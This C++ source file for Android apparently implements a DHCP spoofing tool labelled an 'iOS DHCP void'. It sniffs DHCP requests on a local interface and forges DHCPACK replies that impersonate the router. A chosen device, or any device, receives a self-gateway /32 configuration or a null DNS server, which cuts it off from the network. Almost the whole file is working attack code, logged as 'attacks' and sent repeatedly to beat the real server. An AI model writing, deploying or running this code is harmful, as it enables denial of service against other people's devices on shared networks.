#include "ios_dhcp_void.h"
#include <android/log.h>
#include <cstring>
#include <thread>
#include <mutex>
#include <atomic>
#include <vector>
#include <map>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ether.h>
#include <netpacket/packet.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>

#define LOG_TAG "IOSDHCPVoid"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

// DHCP header (BOOTP) — packed for raw socket use
#pragma pack(push, 1)
struct dhcp_packet {
    uint8_t  op;           // 1=BOOTREQUEST, 2=BOOTREPLY
    uint8_t  htype;        // Hardware addr type (1=Ethernet)
    uint8_t  hlen;         // Hardware addr length (6)
    uint8_t  hops;         // Client sets to 0
    uint32_t xid;          // Transaction ID
    uint16_t secs;         // Seconds elapsed
    uint16_t flags;        // Flags (0x8000 = broadcast)
    uint32_t ciaddr;       // Client IP
    uint32_t yiaddr;       // Your IP (assigned by server)
    uint32_t siaddr;       // Server IP
    uint32_t giaddr;       // Relay agent IP
    uint8_t  chaddr[16];   // Client MAC
    char     sname[64];    // Server hostname (optional)
    char     file[128];    // Boot file (optional)
    uint32_t magic_cookie; // 0x63825363
    uint8_t  options[312]; // DHCP options
};
#pragma pack(pop)

// Pseudo-header for UDP checksum calculation
struct pseudo_header {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t  placeholder;
    uint8_t  protocol;
    uint16_t udp_length;
};

// Global state
static std::atomic<bool> g_void_active(false);
static std::thread *g_void_thread = nullptr;
static std::atomic<bool> g_void_stop(false);
static int g_void_raw_sock = -1;
static IOSDHCPVoidRule g_current_rule;

// Forward declarations
static uint16_t checksum(uint16_t *buf, int len);
static uint16_t udp_checksum(struct pseudo_header *psh, uint8_t *udp_data, int udp_len);
static int build_dhcp_ack_packet(uint8_t *buffer, int buf_size, 
                                  const uint8_t *client_mac_bytes,
                                  uint32_t xid, uint32_t client_ip,
                                  const IOSDHCPVoidRule &rule);

// Checksum calculation
static uint16_t checksum(uint16_t *buf, int len) {
    uint32_t sum = 0;
    for (int i = 0; i < len / 2; i++) {
        sum += buf[i];
    }
    if (len % 2) {
        sum += ((uint8_t *)buf)[len - 1];
    }
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    return (uint16_t)~sum;
}

static uint16_t udp_checksum(struct pseudo_header *psh, uint8_t *udp_data, int udp_len) {
    uint8_t *buf = (uint8_t *)malloc(sizeof(struct pseudo_header) + udp_len);
    memcpy(buf, psh, sizeof(struct pseudo_header));
    memcpy(buf + sizeof(struct pseudo_header), udp_data, udp_len);
    uint16_t result = checksum((uint16_t *)buf, sizeof(struct pseudo_header) + udp_len);
    free(buf);
    return result;
}

// Build a complete Ethernet/IP/UDP/DHCP ACK packet
static int build_dhcp_ack_packet(uint8_t *buffer, int buf_size,
                                  const uint8_t *client_mac_bytes,
                                  uint32_t xid, uint32_t client_ip,
                                  const IOSDHCPVoidRule &rule) {
    if (buf_size < 512) return -1;

    uint8_t router_mac_bytes[6];
    uint8_t target_mac_bytes[6];

    // Parse MACs
    if (sscanf(rule.router_mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &router_mac_bytes[0], &router_mac_bytes[1], &router_mac_bytes[2],
               &router_mac_bytes[3], &router_mac_bytes[4], &router_mac_bytes[5]) != 6) {
        LOGE("Failed to parse router MAC: %s", rule.router_mac.c_str());
        return -1;
    }
    memcpy(target_mac_bytes, client_mac_bytes, 6);

    // --- Ethernet header (14 bytes) ---
    struct ether_header *eth = (struct ether_header *)buffer;
    memcpy(eth->ether_dhost, target_mac_bytes, 6);
    memcpy(eth->ether_shost, router_mac_bytes, 6);
    eth->ether_type = htons(ETHERTYPE_IP);

    // --- IP header (20 bytes) ---
    struct iphdr *ip = (struct iphdr *)(buffer + sizeof(struct ether_header));
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = 0; // will fill later
    ip->id = htons(0x1337);
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    uint32_t router_ip_raw = inet_addr(rule.router_ip.c_str());
    ip->saddr = router_ip_raw;
    ip->daddr = client_ip;

    // --- UDP header (8 bytes) ---
    int ip_hdr_len = sizeof(struct iphdr);
    struct udphdr *udp = (struct udphdr *)(buffer + sizeof(struct ether_header) + ip_hdr_len);
    udp->source = htons(67);
    udp->dest = htons(68);
    udp->len = 0; // will fill
    udp->check = 0;

    // --- DHCP payload ---
    uint8_t *dhcp_start = buffer + sizeof(struct ether_header) + ip_hdr_len + sizeof(struct udphdr);
    struct dhcp_packet *dhcp = (struct dhcp_packet *)dhcp_start;

    memset(dhcp, 0, sizeof(struct dhcp_packet));
    dhcp->op = 2;              // BOOTREPLY
    dhcp->htype = 1;           // Ethernet
    dhcp->hlen = 6;
    dhcp->hops = 0;
    dhcp->xid = xid;
    dhcp->secs = 0;
    dhcp->flags = htons(0x8000); // Broadcast flag (iOS may check this)
    dhcp->ciaddr = 0;
    dhcp->yiaddr = client_ip;
    dhcp->siaddr = router_ip_raw;
    dhcp->giaddr = 0;
    memcpy(dhcp->chaddr, client_mac_bytes, 6);
    dhcp->magic_cookie = htonl(0x63825363);

    // DHCP options
    uint8_t *opt = dhcp->options;
    int opt_len = 0;

    // Option 53: DHCP Message Type = ACK (5)
    opt[opt_len++] = 53;
    opt[opt_len++] = 1;
    opt[opt_len++] = 5;

    // Option 54: Server Identifier = router IP
    opt[opt_len++] = 54;
    opt[opt_len++] = 4;
    memcpy(&opt[opt_len], &router_ip_raw, 4);
    opt_len += 4;

    if (rule.nullify_dns) {
        // TERTIARY VOID: Set DNS to null
        // Option 1: Subnet Mask — normal subnet mask
        opt[opt_len++] = 1;
        opt[opt_len++] = 4;
        uint32_t normal_mask = inet_addr("255.255.255.0");
        memcpy(&opt[opt_len], &normal_mask, 4);
        opt_len += 4;

        // Option 3: Router — normal gateway
        opt[opt_len++] = 3;
        opt[opt_len++] = 4;
        memcpy(&opt[opt_len], &router_ip_raw, 4);
        opt_len += 4;

        // Option 6: DNS Server = 0.0.0.0 (NULL)
        opt[opt_len++] = 6;
        opt[opt_len++] = 4;
        uint32_t null_ip = 0;
        memcpy(&opt[opt_len], &null_ip, 4);
        opt_len += 4;
    } else {
        // PRIMARY VOID: Self-gateway with /32 mask
        // Option 1: Subnet Mask = 255.255.255.255 (/32)
        opt[opt_len++] = 1;
        opt[opt_len++] = 4;
        uint32_t host_mask = inet_addr("255.255.255.255");
        memcpy(&opt[opt_len], &host_mask, 4);
        opt_len += 4;

        // Option 3: Router = client's own IP (SELF-GATEWAY)
        opt[opt_len++] = 3;
        opt[opt_len++] = 4;
        memcpy(&opt[opt_len], &client_ip, 4);
        opt_len += 4;

        // Option 6: DNS Server — give a dummy so DNS isn't the vector here
        opt[opt_len++] = 6;
        opt[opt_len++] = 4;
        uint32_t dummy_dns = inet_addr("192.0.2.1");
        memcpy(&opt[opt_len], &dummy_dns, 4);
        opt_len += 4;
    }

    // Option 51: Lease Time = 3600 seconds
    opt[opt_len++] = 51;
    opt[opt_len++] = 4;
    uint32_t lease = htonl(3600);
    memcpy(&opt[opt_len], &lease, 4);
    opt_len += 4;

    // Option 255: End
    opt[opt_len++] = 255;

    // Pad remaining options with zeros
    int dhcp_total = sizeof(struct dhcp_packet) - sizeof(dhcp->options) + opt_len;

    // Calculate total packet size
    int udp_len = sizeof(struct udphdr) + dhcp_total;
    int total_len = sizeof(struct ether_header) + ip_hdr_len + udp_len;

    // Fill in IP total length
    ip->tot_len = htons(ip_hdr_len + udp_len);

    // Fill in UDP length
    udp->len = htons(udp_len);

    // Calculate IP checksum
    ip->check = checksum((uint16_t *)ip, ip_hdr_len);

    // Calculate UDP checksum
    struct pseudo_header psh;
    psh.source_address = ip->saddr;
    psh.dest_address = ip->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_UDP;
    psh.udp_length = htons(udp_len);
    udp->check = udp_checksum(&psh, (uint8_t *)udp, udp_len);

    return total_len;
}

// Sniff a DHCP packet and extract XID + client MAC
static int sniff_dhcp_request(int raw_sock, uint8_t *client_mac_out, uint32_t *xid_out, uint32_t *client_ip_out) {
    uint8_t sniff_buf[2048];
    struct sockaddr_ll addr;
    socklen_t addr_len = sizeof(addr);

    while (!g_void_stop) {
        int n = recvfrom(raw_sock, sniff_buf, sizeof(sniff_buf), 0,
                         (struct sockaddr *)&addr, &addr_len);
        if (n < 0) {
            if (errno == EINTR) continue;
            if (errno == EAGAIN || errno == EWOULDBLOCK) continue;
            LOGE("Sniff error: %s", strerror(errno));
            return -1;
        }

        // Parse Ethernet header
        struct ether_header *eth = (struct ether_header *)sniff_buf;
        if (ntohs(eth->ether_type) != ETHERTYPE_IP) continue;

        // Parse IP header
        struct iphdr *ip = (struct iphdr *)(sniff_buf + sizeof(struct ether_header));
        if (ip->protocol != IPPROTO_UDP) continue;

        int ip_hdr_len = ip->ihl * 4;
        struct udphdr *udp = (struct udphdr *)((uint8_t *)ip + ip_hdr_len);

        // Check for DHCP traffic: source port 68 or dest port 67
        if (ntohs(udp->source) != 68 && ntohs(udp->dest) != 67) continue;

        // Parse DHCP
        uint8_t *dhcp_raw = (uint8_t *)udp + sizeof(struct udphdr);
        int dhcp_avail = n - (sizeof(struct ether_header) + ip_hdr_len + sizeof(struct udphdr));
        if (dhcp_avail < (int)sizeof(struct dhcp_packet) - 312) continue;

        struct dhcp_packet *dhcp = (struct dhcp_packet *)dhcp_raw;
        if (ntohl(dhcp->magic_cookie) != 0x63825363) continue;
        if (dhcp->op != 1) continue; // Must be BOOTREQUEST

        // Extract DHCP message type from options
        int msg_type = -1;
        {
            uint8_t *opts = dhcp->options;
            // Max options = actual received bytes after fixed header, capped at 312
            int max_opt = dhcp_avail - (sizeof(struct dhcp_packet) - sizeof(dhcp->options));
            if (max_opt > 312) max_opt = 312;
            if (max_opt < 0) max_opt = 0;

            int o = 0;
            while (o < max_opt) {
                uint8_t code = opts[o];
                if (code == 255) break; // End
                if (code == 0) { o++; continue; } // Pad
                if (o + 1 >= max_opt) break;
                uint8_t len = opts[o + 1];
                if (code == 53 && len == 1 && o + 2 < max_opt) {
                    msg_type = opts[o + 2];
                }
                o += 2 + len;
            }
        }

        // Accept DHCP REQUEST (type 3) or DHCP DISCOVER (type 1)
        // Also accept DHCP INFORM (type 8) and DHCP RENEWAL which uses REQUEST
        if (msg_type == 3 || msg_type == 1) {
            memcpy(client_mac_out, dhcp->chaddr, 6);
            *xid_out = dhcp->xid;
            *client_ip_out = dhcp->ciaddr;

            // If ciaddr is 0, use yiaddr from the packet or client IP from IP header
            if (*client_ip_out == 0) {
                *client_ip_out = ip->saddr;
            }

            LOGD("Captured DHCP %s: MAC=%02x:%02x:%02x:%02x:%02x:%02x XID=0x%x CIADDR=%s",
                 msg_type == 3 ? "REQUEST" : "DISCOVER",
                 client_mac_out[0], client_mac_out[1], client_mac_out[2],
                 client_mac_out[3], client_mac_out[4], client_mac_out[5],
                 ntohl(dhcp->xid), inet_ntoa(*(struct in_addr *)&dhcp->ciaddr));
            return n;
        }
    }
    return -1;
}

// The main void thread
static void ios_dhcp_void_thread_func() {
    LOGD("iOS DHCP void thread starting on interface: %s", g_current_rule.interface_name.c_str());

    g_current_rule.interface_name.c_str();

    // Create raw socket for sniffing on the interface
    g_void_raw_sock = socket(AF_PACKET, SOCK_RAW, htons(ETHERTYPE_IP));
    if (g_void_raw_sock < 0) {
        LOGE("Failed to create raw socket: %s", strerror(errno));
        return;
    }

    // Bind to interface
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, g_current_rule.interface_name.c_str(), IFNAMSIZ - 1);
    if (setsockopt(g_void_raw_sock, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof(ifr)) < 0) {
        LOGE("Failed to bind to interface %s: %s", g_current_rule.interface_name.c_str(), strerror(errno));
        close(g_void_raw_sock);
        g_void_raw_sock = -1;
        return;
    }

    // Set receive timeout for periodic checks
    struct timeval tv;
    tv.tv_sec = 2;
    tv.tv_usec = 0;
    setsockopt(g_void_raw_sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    LOGD("iOS DHCP void listening for DHCP requests on %s...", g_current_rule.interface_name.c_str());

    uint8_t client_mac[6];
    uint32_t xid;
    uint32_t client_ip;
    int attack_count = 0;

    while (!g_void_stop) {
        int result = sniff_dhcp_request(g_void_raw_sock, client_mac, &xid, &client_ip);
        if (result < 0) {
            if (g_void_stop) break;
            continue;
        }

        // Check if this client matches our target (by MAC, or any if target_mac is wildcard)
        std::string sniffed_mac_str;
        {
            char buf[18];
            snprintf(buf, sizeof(buf), "%02x:%02x:%02x:%02x:%02x:%02x",
                     client_mac[0], client_mac[1], client_mac[2],
                     client_mac[3], client_mac[4], client_mac[5]);
            sniffed_mac_str = std::string(buf);
        }

        // If a specific target MAC is set, only attack that device
        if (!g_current_rule.target_mac.empty() && 
            g_current_rule.target_mac != "ff:ff:ff:ff:ff:ff" &&
            strcasecmp(g_current_rule.target_mac.c_str(), sniffed_mac_str.c_str()) != 0) {
            LOGD("Skipping non-target MAC: %s", sniffed_mac_str.c_str());
            continue;
        }

        LOGD("✓ Target matched! Launching DHCP void against %s (XID: 0x%x)",
             sniffed_mac_str.c_str(), ntohl(xid));

        // Build the poisoned DHCPACK packet
        uint8_t packet_buf[1024];
        int pkt_len = build_dhcp_ack_packet(packet_buf, sizeof(packet_buf),
                                             client_mac, xid, client_ip,
                                             g_current_rule);
        if (pkt_len <= 0) {
            LOGE("Failed to build DHCP void packet");
            continue;
        }

        // Fire it 5 times quickly to beat the legitimate server
        struct sockaddr_ll dest;
        memset(&dest, 0, sizeof(dest));
        dest.sll_family = AF_PACKET;
        dest.sll_ifindex = if_nametoindex(g_current_rule.interface_name.c_str());
        dest.sll_halen = 6;
        memcpy(dest.sll_addr, client_mac, 6);
        dest.sll_protocol = htons(ETHERTYPE_IP);

        for (int i = 0; i < 5; i++) {
            ssize_t sent = sendto(g_void_raw_sock, packet_buf, pkt_len, 0,
                                  (struct sockaddr *)&dest, sizeof(dest));
            if (sent > 0) {
                LOGD("  -> Fired void ACK #%d (%zd bytes)", i + 1, sent);
            } else {
                LOGE("  -> Failed void ACK #%d: %s", i + 1, strerror(errno));
            }
            usleep(50000); // 50ms between shots
        }

        attack_count++;
        LOGD("✓ DHCP void attack #%d complete for %s", attack_count, sniffed_mac_str.c_str());

        // Brief pause before next sniff cycle
        usleep(100000);
    }

    close(g_void_raw_sock);
    g_void_raw_sock = -1;
    LOGD("iOS DHCP void thread stopped. Total attacks: %d", attack_count);
}

bool ios_dhcp_void_init() {
    LOGD("Initializing iOS DHCP void operations");
    return true;
}

bool ios_dhcp_void_start(const IOSDHCPVoidRule &rule) {
    LOGD("Starting iOS DHCP void (%s) against MAC %s on %s",
         rule.nullify_dns ? "DNS NULLIFY" : "SELF-GATEWAY",
         rule.target_mac.c_str(), rule.interface_name.c_str());

    if (g_void_active.load()) {
        LOGE("iOS DHCP void already active");
        return false;
    }

    g_current_rule = rule;
    g_void_stop = false;

    try {
        g_void_thread = new std::thread(ios_dhcp_void_thread_func);
        g_void_active = true;
        LOGD("✓ iOS DHCP void started");
        return true;
    } catch (const std::exception &e) {
        LOGE("Failed to start thread: %s", e.what());
        return false;
    }
}

bool ios_dhcp_nullify_dns_start(const IOSDHCPVoidRule &rule) {
    IOSDHCPVoidRule modified = rule;
    modified.nullify_dns = true;
    return ios_dhcp_void_start(modified);
}

void ios_dhcp_void_stop() {
    LOGD("Stopping iOS DHCP void");
    if (!g_void_active.load()) return;

    g_void_stop = true;
    if (g_void_raw_sock >= 0) {
        close(g_void_raw_sock);
        g_void_raw_sock = -1;
    }
    if (g_void_thread && g_void_thread->joinable()) {
        g_void_thread->join();
        delete g_void_thread;
        g_void_thread = nullptr;
    }
    g_void_active = false;
    LOGD("✓ iOS DHCP void stopped");
}

bool ios_dhcp_void_is_active() {
    return g_void_active.load();
}

void ios_dhcp_void_cleanup() {
    LOGD("Cleaning up iOS DHCP void");
    ios_dhcp_void_stop();
}
